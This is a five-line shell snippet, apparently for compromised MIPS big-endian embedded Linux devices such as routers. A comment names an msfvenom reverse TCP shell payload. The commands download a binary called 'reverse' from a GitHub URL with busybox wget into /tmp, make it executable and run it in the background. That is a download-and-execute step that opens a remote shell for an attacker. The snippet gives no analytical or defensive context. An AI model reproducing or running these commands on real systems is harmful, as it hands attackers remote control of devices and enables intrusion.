# (msfvenom) linux/mipsbe/shell/reverse_tcp
cd /tmp/
busybox wget -O reverse https://github.com/finn79426/test/raw/master/reverse
busybox chmod +x reverse
./reverse &
